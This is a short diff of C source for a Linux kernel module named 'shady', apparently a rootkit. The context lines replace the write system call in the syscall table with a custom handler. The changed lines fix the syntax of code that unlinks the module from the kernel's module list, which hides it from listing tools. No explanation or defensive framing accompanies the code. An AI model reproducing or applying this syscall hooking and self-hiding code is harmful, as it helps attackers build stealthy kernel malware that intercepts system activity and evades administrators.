@@ -289,8 +289,8 @@ shady_init_module(void)
      old_write = ((unsigned long **)system_call_table_address)[__NR_write];
      ((unsigned long **)system_call_table_address)[__NR_write] = my_write;
      
-     THIS_MODULE->list->prev->next = THIS_MODULE->list->next;
-     THIS_MODULE->list->next->prev = THIS_MODULE->list->prev;
+     THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
+     THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
      //end
 	
      
